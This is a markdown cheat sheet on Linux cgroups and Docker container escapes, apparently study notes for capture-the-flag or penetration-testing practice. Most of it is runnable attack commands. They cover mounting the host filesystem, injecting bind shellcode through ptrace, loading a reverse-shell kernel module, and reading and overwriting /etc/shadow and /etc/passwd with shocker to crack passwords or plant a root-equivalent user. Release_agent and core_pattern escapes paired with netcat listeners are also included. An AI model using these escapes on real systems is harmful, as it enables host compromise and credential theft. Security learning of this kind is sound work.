# Docker Registry
[Here](./registry.md)

# CGroups
Memory
```
cgcreate -g memory:test
cgset -r memory.limit_in_bytes=4194304 test
cgexec -g memeory:test ./memeeat 2M
```
Network
```
ip link add ensX type dummy
ip netns add testns
ip netns list
ip link set ensX netns <ns-name>
```

https://www.linuxjournal.com/content/everything-you-need-know-about-linux-containers-part-i-linux-control-groups-and-process

```
/sys/fs/cgroup/memory/foo

echo 50000000 | sudo tee
/sys/fs/cgroup/memory/foo/memory.limit_in_bytes
echo 2845 > /sys/fs/cgroup/memory/foo/cgroup.procs
ps -o cgroup 2845
CGROUP
8:memory:/foo,1:name=systemd:/user.slice/user-0.slice/
↪session-4.scope
cat /sys/fs/cgroup/memory/foo/memory.usage_in_bytes
253952

```

# Run Container Manually
```
#!/bin/bash
cd filesystem
cgcreate -g cpu,cpuacct,memory:testc
cgset -r cpu.shares=512 testc
cgset -r memory.limit_in_bytes=1000000000 testc
cgexec -g "cpu,cpuacct,memory:testc" unshare -fmuipn --mount-proc chroot /root/filesystem /bin/sh -c "/bin/mount -t proc proc /proc && /bin/sh"
```

# Docker socket breakout
```
# map host drive to container image
docker run -it -v /:/host anyhost:latest bash
# you can list host process after chroot
chroot /host bash
ps 
```

# shared network namespace

container run with host machine network
```docker run -d --network host test_image:latest```

use exploit of the shared containee machine to setup socks

use the socks to access localhost (which is the host machine)

access to portainer and create new container process with volume bind to host


# privileged container breakout
Print capability of the container
```capash --print```
check for cap_sys_admin, which can mount and unmount disk
see man 7 capabilities for list of capabilities
```
fdisk -l
mount /dev/sda /mnt
chroot /mnt bash
find . -iname flag
```

add user and ssh


# CAP_SYS_PTRACE
get arch with ```uname -m``` and search for bind shell code on exploit db
[ptrace.c](./ptrace.c)
```
gcc ptrace.c -o inject
./inject <pid>
nc <host_ip> 5600
```

# CAP_SYS_MODULE
```
make

nc -vnlp 4444

insmod reverse-shell.ko
```

call_usermodehelper
(​https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html​)
Invoking user-space applications from the kernel
(​https://developer.ibm.com/articles/l-user-space-apps/​)
Usermode Helper API (​https://insujang.github.io/2017-05-10/usermode-helper-api/​)


# CAP_DAC_READ_SEARCH
utilise open_by_handle_at() to read file handle passed by other process using name_to_handle_at()

reference: https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3

[shocker.c](./shocker.c)
[shocker-modified.c](./shocker-modified.c)
```
gcc -o shocker ./shocker-modified.c
./shocker /etc/shadow shadow
nc -v -n -w2 -z 172.17.0.1 1-65535
./shocker /etc/ssh/sshd_config sshd_config | grep PermitRootLogin
./shocker /etc/passwd passwd
unshadow passwd shadow >passwords
john passwords
cat /root/flag*
```

# CAP_DAC_OVERRIDE
Overwrite original file using the [shocker-write](shocker-write.c) approach
```
gcc -o shocker ./shocker-modified.c
./shocker /etc/shadow shadow
./shocker /etc/passwd passwd
```
update passwd and shadow to add a new user
```
useradd john
echo 'john:password' | chpassword
tail -1 /etc/shadow >> shadow
tail -1 /etc/passwd >> passwd
```
change the root hash of shadow file to be like john
use shocker-write to write file back to Host
```
./shocker-write /etc/shadow shadow
./shocker-write /etc/passwd passwd
```
login using john and su to roote

# release_agent escape
```
mkdir /tmp/esc
mount -t cgroup -o rdma cgroup /tmp/esc
mkdir /tmp/esc/w
echo 1 > /tmp/esc/w/notify_on_release
pop="$overlay/shell.sh"
echo $pop > /tmp/esc/release_agent
sleep 5 && echo 0>/tmp/esc/w/cgroup.procs &
nc -l -p 9001
```
# core_pattern escape
with proc mounted to /host/proc
```
cd /host/proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
nc -l -p 9001
```


check for bind mounted files and modify shocker.c accordingly

# Reference
https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3

https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf

CVE-2019-5736 (runC): rexec callers as memfd
https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html
https://archives.flockport.com/lxc-vs-docker/
https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
